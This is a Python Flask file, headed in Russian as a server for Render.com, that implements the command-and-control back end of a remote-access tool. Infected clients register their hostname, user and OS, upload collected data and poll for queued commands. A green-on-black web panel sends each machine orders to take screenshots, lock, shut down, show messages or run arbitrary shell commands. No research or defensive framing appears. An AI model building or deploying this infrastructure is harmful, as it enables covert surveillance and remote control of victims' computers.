# =====================================================================
# СЕРВЕР ДЛЯ RENDER.COM
# Сохранить как server.py
# =====================================================================
from flask import Flask, request, jsonify
import time
import threading

app = Flask(__name__)

clients = {}
commands = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    client_id = str(int(time.time() * 1000))
    clients[client_id] = {
        "hostname": data.get("hostname"),
        "username": data.get("username"),
        "os": data.get("os"),
        "last_seen": time.time(),
        "data": []
    }
    commands[client_id] = []
    print(f"[+] Client registered: {client_id} - {data.get('hostname')}")
    return jsonify({"id": client_id})

@app.route('/data/<client_id>', methods=['POST'])
def receive_data(client_id):
    if client_id in clients:
        clients[client_id]["data"].append(request.json)
        clients[client_id]["last_seen"] = time.time()
    return jsonify({"status": "ok"})

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    if client_id in commands and commands[client_id]:
        return jsonify(commands[client_id].pop(0))
    return jsonify({"command": "ping"})

@app.route('/clients', methods=['GET'])
def get_clients():
    result = {}
    for cid, info in clients.items():
        if time.time() - info["last_seen"] < 30:
            result[cid] = {
                "hostname": info["hostname"],
                "username": info["username"],
                "os": info["os"],
                "data": info["data"][-1:] if info["data"] else []
            }
    return jsonify(result)

@app.route('/send_command/<client_id>', methods=['POST'])
def add_command(client_id):
    if client_id in commands:
        commands[client_id].append(request.json)
    return jsonify({"status": "ok"})

@app.route('/')
def home():
    return """
    <html>
    <head><title>Control Panel</title>
    <style>
        body { background:#111; color:#0f0; font-family:monospace; }
        .client { border:1px solid #333; margin:10px; padding:10px; background:#1a1a1a; }
        button { background:#333; color:#0f0; border:1px solid #0f0; padding:8px 15px; margin:3px; cursor:pointer; }
        button:hover { background:#0f0; color:#000; }
        input { background:#000; color:#0f0; border:1px solid #333; padding:8px; margin:3px; }
        .data { background:#000; padding:10px; margin-top:10px; white-space:pre-wrap; max-height:200px; overflow:auto; }
    </style>
    <script>
        setInterval(function() {
            fetch('/clients').then(r => r.json()).then(data => {
                let html = '';
                for(let id in data) {
                    let d = data[id];
                    html += `<div class="client">
                        <h3>${d.hostname}</h3>
                        <p>User: ${d.username} | OS: ${d.os}</p>
                        <button onclick="send('${id}','screenshot')">📸 Screenshot</button>
                        <button onclick="send('${id}','sysinfo')">💻 SysInfo</button>
                        <button onclick="send('${id}','lock')">🔒 Lock</button>
                        <button onclick="send('${id}','unlock')">🔓 Unlock</button>
                        <button onclick="send('${id}','shutdown')">⏻ Shutdown</button>
                        <button onclick="send('${id}','message',prompt('Message:'))">💬 Message</button>
                        <br>
                        <input id="cmd_${id}" placeholder="Command...">
                        <button onclick="send('${id}','exec',document.getElementById('cmd_${id}').value)">Exec</button>
                        <div class="data">${JSON.stringify(d.data)}</div>
                    </div>`;
                }
                document.getElementById('clients').innerHTML = html || '<p>No clients connected</p>';
            });
        }, 2000);
        
        function send(id, command, param) {
            fetch('/send_command/' + id, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: command, cmd: param, text: param})
            });
        }
    </script>
    </head>
    <body>
        <h1>🖥 Control Panel</h1>
        <div id="clients">Loading...</div>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)